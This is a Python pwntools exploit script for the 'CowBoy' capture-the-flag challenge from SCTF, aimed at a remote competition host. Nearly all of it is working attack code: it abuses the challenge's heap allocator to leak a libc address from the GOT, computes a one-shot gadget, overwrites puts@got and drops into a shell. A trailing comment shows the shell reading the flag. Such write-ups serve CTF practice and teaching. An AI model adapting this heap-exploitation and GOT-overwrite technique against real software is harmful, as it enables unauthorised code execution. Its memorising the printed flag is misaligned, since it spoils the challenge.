from pwn import *
from time import sleep
import json

#r = process('./CowBoy')
r = remote('cowboy.eatpwnnosleep.com', 14697)
a = {
    'apikey' : '',
}

r.send(json.dumps(a).encode())
r.recv(102400)

c2 = lambda:r.recvuntil('----------------------------------------')
sl = lambda x:r.sendline(str(x))
s = lambda x:r.send(str(x))

def alloc(size):
	sl(1)
	sleep(0.1)
	sl(size)
	sleep(0.1)
	return r.recv()

def free(bins,chunk):
	sl(2)
	sleep(0.1)
	sl(bins)
	sleep(0.1)
	sl(chunk)
	sleep(0.1)
	r.recv()


def show():
	sl(3)
	sleep(0.1)
	p = c2()
	sleep(0.1)
	r.recv()
	return p


def fill(bins,chunk,contents):
	sl(4)
	sleep(0.1)
	sl(bins)
	sleep(0.1)
	sl(chunk)
	sleep(0.1)
	s(contents)
	sleep(0.1)
	r.recv()


alloc(1) # bin 0, chunk 0
sleep(0.1)
fill(0,0,'a'*8+p64(0x0000000000602090)) # rand@got; bin 0, chunk 2
sleep(0.1)
alloc(1) # bin 0, chunk 1
sleep(0.1)
LeakLibc = int(show().split('\n')[0].split('0x')[-1],16)
success('rand@got : '+hex(LeakLibc));
LibcBase = LeakLibc - 0x3AF60
success('LibcBase : '+hex(LibcBase));
LibcOneShot = LibcBase + 0x4526a
success('LibcOneShot : '+hex(LibcOneShot));
sleep(0.1)
LeakHeap = int(alloc(1).split('0x')[1].split('\n')[0],16)  # bin 0, chunk 3
sleep(0.1)
success('LeakHeap : '+hex(LeakHeap))
fill(0,3,p64(0x0000000000602020)) # puts@got 
sleep(0.1)
alloc(1) # bin 0, chunk 4
sleep(0.1)
fill(0,4,'a'*8+p64(LeakHeap)) # bin 0, chunk 6
sleep(0.1)
alloc(1) # bin 0, chunk 5
sleep(0.1)
fill(0,6,p64(LibcOneShot)) # Overwrite puts@got -> oneshot gadget
sleep(0.1)

r.interactive()

'''
$ ls
CowBoy
flag
$ cat flag
SCTF{H4v3_y0u_ev3r_seen_CowBoy_B1B0P?}
'''

